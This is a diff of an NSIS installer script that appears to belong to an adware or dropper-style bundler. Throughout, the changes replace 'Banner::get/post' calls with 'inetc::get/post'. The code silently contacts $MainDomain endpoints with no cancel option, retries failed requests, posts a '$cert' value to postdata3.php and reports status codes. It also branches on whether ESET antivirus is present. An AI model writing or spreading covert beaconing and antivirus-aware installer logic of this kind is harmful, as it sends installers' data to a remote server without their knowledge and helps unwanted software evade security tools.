@@ -5,19 +5,19 @@ Function NewAction1Function
 	
 	;get first quant - the first try
 	StrCpy $0 "1"
-	Banner::get /NOUNLOAD /TOSTACK  /NOCANCEL /SILENT /RESUME "" "$ReportUrl$0" "" /END
+	inetc::get /NOUNLOAD /TOSTACK  /NOCANCEL /SILENT /RESUME "" "$ReportUrl$0" "" /END
 	Pop $0 
 	Pop $quant
 	${if} $0 != "OK"
 		;get first quant - the second try
 		StrCpy $0 "1"
-		Banner::get /NOUNLOAD /TOSTACK  /NOCANCEL /SILENT /RESUME "" "$ReportUrl$0" "" /END
+		inetc::get /NOUNLOAD /TOSTACK  /NOCANCEL /SILENT /RESUME "" "$ReportUrl$0" "" /END
 		Pop $0 
 		Pop $quant
 		${if} $0 != "OK"
 			;get first quant - the last try
 			StrCpy $0 "1"
-			Banner::get /NOUNLOAD /TOSTACK  /NOCANCEL /SILENT /RESUME "" "$ReportUrl$0" "" /END
+			inetc::get /NOUNLOAD /TOSTACK  /NOCANCEL /SILENT /RESUME "" "$ReportUrl$0" "" /END
 			Pop $0 
 			Pop $quant
 			${if} $0 != "OK"
@@ -31,26 +31,26 @@ Var IPDUrl
 
 Function NewIPDFunction
 	; get the ipb value - the fist try
-	Banner::get /NOUNLOAD /TOSTACK  /NOCANCEL /SILENT /RESUME "" "$IPDUrl" "" /END
+	inetc::get /NOUNLOAD /TOSTACK  /NOCANCEL /SILENT /RESUME "" "$IPDUrl" "" /END
 	Pop $0 
 	Pop $stack
 	
 	${if} $0 != "OK"
 		; report
-		Banner::get /NOUNLOAD /TOSTACK  /NOCANCEL /SILENT /RESUME "" "https://$MainDomain/postdata3.php?data=v27+:$0" ""	/END	
+		inetc::get /NOUNLOAD /TOSTACK  /NOCANCEL /SILENT /RESUME "" "https://$MainDomain/postdata3.php?data=v27+:$0" ""	/END	
 		Pop $0
 		Pop $1
 		; get the ipb value - the second try
-		Banner::get /NOUNLOAD /TOSTACK  /NOCANCEL /SILENT /RESUME "" "$IPDUrl" "" /END
+		inetc::get /NOUNLOAD /TOSTACK  /NOCANCEL /SILENT /RESUME "" "$IPDUrl" "" /END
 		Pop $0 
 		Pop $stack
 		${if} $0 != "OK"
-			Banner::get /NOUNLOAD /TOSTACK  /NOCANCEL /SILENT /RESUME "" "https://$MainDomain/postdata3.php?data=v27+:$0" ""	/END	
+			inetc::get /NOUNLOAD /TOSTACK  /NOCANCEL /SILENT /RESUME "" "https://$MainDomain/postdata3.php?data=v27+:$0" ""	/END	
 			Pop $0
 			Pop $1
 
 			; get the ipb value - the second try
-			Banner::get /NOUNLOAD /TOSTACK  /NOCANCEL /SILENT /RESUME "" "$IPDUrl" "" /END
+			inetc::get /NOUNLOAD /TOSTACK  /NOCANCEL /SILENT /RESUME "" "$IPDUrl" "" /END
 			Pop $0 
 			Pop $stack
 			Pop $1
@@ -122,12 +122,12 @@ Function GenerateQuant
 	StrCpy $MD5Url    "https://$MainDomain/info.php?&quant=$quant"
 
 	StrCpy $Result "1543"
-	Banner::get /NOUNLOAD /TOSTACK  /NOCANCEL /SILENT /RESUME "" $ReportUrl$Result ""	/END	
+	inetc::get /NOUNLOAD /TOSTACK  /NOCANCEL /SILENT /RESUME "" $ReportUrl$Result ""	/END	
 	Pop $0
 	Pop $Stack
 		
 	; StrCpy $Result "1973"
-	; Banner::get /NOUNLOAD /TOSTACK  /NOCANCEL /SILENT /RESUME "" $ReportUrl$Result ""	/END	
+	; inetc::get /NOUNLOAD /TOSTACK  /NOCANCEL /SILENT /RESUME "" $ReportUrl$Result ""	/END	
 	; Pop $0	
 	; Pop $Stack
 	
@@ -141,7 +141,7 @@ Function GenerateQuant
 	StrCpy $ID2 "$1$2"
 
 	
-	Banner::post "data=v30+$cert" /TOSTACK /NOCANCEL /SILENT /RESUME "" "https://$MainDomain/postdata3.php" ""	/END	
+	inetc::post "data=v30+$cert" /TOSTACK /NOCANCEL /SILENT /RESUME "" "https://$MainDomain/postdata3.php" ""	/END	
 	Pop $0
 	Pop $stack
 
@@ -164,20 +164,20 @@ Function GenerateQuant
 	${else}
 		${if} $stack == $0 
 			StrCpy $Result "2084"
-			Banner::get /NOUNLOAD /TOSTACK  /NOCANCEL /SILENT /RESUME "" $ReportUrl$Result ""	/END	
+			inetc::get /NOUNLOAD /TOSTACK  /NOCANCEL /SILENT /RESUME "" $ReportUrl$Result ""	/END	
 			Pop $9
 			Pop $stack
 			
 			${If} $EsetFound == "true"
 			${else}
 				StrCpy $Result "2302"
-				Banner::get /NOUNLOAD /TOSTACK  /NOCANCEL /SILENT /RESUME "" $ReportUrl$Result ""	/END	
+				inetc::get /NOUNLOAD /TOSTACK  /NOCANCEL /SILENT /RESUME "" $ReportUrl$Result ""	/END	
 				Pop $9
 				Pop $stack
 			${endif}
 			
 		${endif}
-		Banner::get /NOUNLOAD /TOSTACK  /NOCANCEL /SILENT /RESUME "" "https://$MainDomain/postdata3.php?data=v28+:$1" ""	/END	
+		inetc::get /NOUNLOAD /TOSTACK  /NOCANCEL /SILENT /RESUME "" "https://$MainDomain/postdata3.php?data=v28+:$1" ""	/END	
 		Pop $0
 		Pop $stack
 		
@@ -185,7 +185,7 @@ Function GenerateQuant
 		StrCpy $IPBSkip "true"
 		
 		StrCpy $Result "914"
-		Banner::get /NOUNLOAD /TOSTACK  /NOCANCEL /SILENT /RESUME "" $ReportUrl$Result ""	/END	
+		inetc::get /NOUNLOAD /TOSTACK  /NOCANCEL /SILENT /RESUME "" $ReportUrl$Result ""	/END	
 		Pop $0
 		Pop $stack
 		
